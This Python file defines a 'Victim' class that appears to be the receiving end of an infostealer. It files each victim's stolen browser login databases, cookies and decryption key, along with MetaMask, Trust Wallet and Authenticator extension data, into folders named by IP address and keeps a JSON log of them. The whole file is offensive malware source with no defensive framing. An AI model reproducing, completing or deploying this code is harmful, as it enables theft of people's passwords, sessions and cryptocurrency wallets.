"""victim class"""
import os
import json


class Victim:
    """class for handling victims"""
    __BROWSERDATA = {"HASH": "KEY", "Login Data": "LOGIN.DB", "Cookies": "COOKIES.DB"}
    __EXTENTIONDATA = {"a": "METAMASK", "b": "TRUST WALLER", "c": "AUTHENTICATOR"}
    __StorageFile = "storage.json"
    CurrentVictim = {}
    AllVictims = {}

    def __init__(self, ip: str) -> None:
        """Initialization of the Victim class"""
        self.ip = ip
        self.__VictimFolder = self.ip
        self.LoadStorage()
        if self.__VictimFolder != None and not os.path.exists(self.__VictimFolder):
            os.mkdir(self.__VictimFolder)

    def SaveStorage(self) -> None:
        """Save current data"""
        self.AllVictims[self.ip] = self.CurrentVictim
        file = open(self.__StorageFile, 'w')
        json.dump(self.AllVictims, file, indent=4)
        file.close()

    def LoadStorage(self) -> None:
        """Load data from storage file or create an empty one"""
        try:
            file = open(self.__StorageFile, 'r')
            StorageData = json.load(file)
            if self.ip in StorageData:
                self.CurrentVictim = StorageData[self.ip]
            else:
                self.CurrentVictim = {"browsers": [], "BrowserCount": 0}
            self.AllVictims = StorageData
        except FileNotFoundError:
            file = open(self.__StorageFile, 'w')
            json.dump({}, file, indent=4)
            self.CurrentVictim = {"browsers": [], "BrowserCount": 0}
        finally:
            file.close()

    def GetFileStoragePath(self, FileName: str) -> str:
        """
        creates storage for given file based on the file itself.
        then log it to the storage file.
        """
        FilePath = ""

        if FileName in self.__BROWSERDATA:
            if FileName == "HASH":
                self.CurrentVictim["BrowserCount"] += 1
                self.CurrentVictim["browsers"].append({"extentions": {}, "browserfiles": []})
            self.__VictimFolder = os.path.join(self.ip, str(self.CurrentVictim["BrowserCount"]))
            if not os.path.exists(self.__VictimFolder):
                os.mkdir(self.__VictimFolder)
            FilePath = os.path.join(self.__VictimFolder, self.__BROWSERDATA[FileName])
            self.LogFile(self.__BROWSERDATA[FileName], None)

        if FileName[0] in self.__EXTENTIONDATA:
            FileAndDir = FileName.split("\\")
            DirName = self.__EXTENTIONDATA[FileAndDir[0]]
            FileName = FileAndDir[1]
            self.__VictimFolder = os.path.join(self.ip, str(self.CurrentVictim["BrowserCount"]))
            ExtentionPathName = os.path.join(self.__VictimFolder, DirName)
            if not os.path.exists(ExtentionPathName):
                os.mkdir(ExtentionPathName)
            FilePath = os.path.join(ExtentionPathName, FileName)
            self.LogFile(FileName, DirName)
        self.SaveStorage()

        return FilePath

    def LogFile(self, FileName: str, FilePath: str = None):
        """log file to the storage file"""
        if FilePath is not None:
            extentions = self.CurrentVictim["browsers"][self.CurrentVictim["BrowserCount"] - 1]["extentions"]
            if FilePath not in extentions:
                extentions[FilePath] = []
                extentions[FilePath].append(FileName)
            else:
                extentions[FilePath].append(FileName)
        else:
            BrowserFiles = self.CurrentVictim["browsers"][self.CurrentVictim["BrowserCount"] - 1]["browserfiles"]
            BrowserFiles.append(FileName)
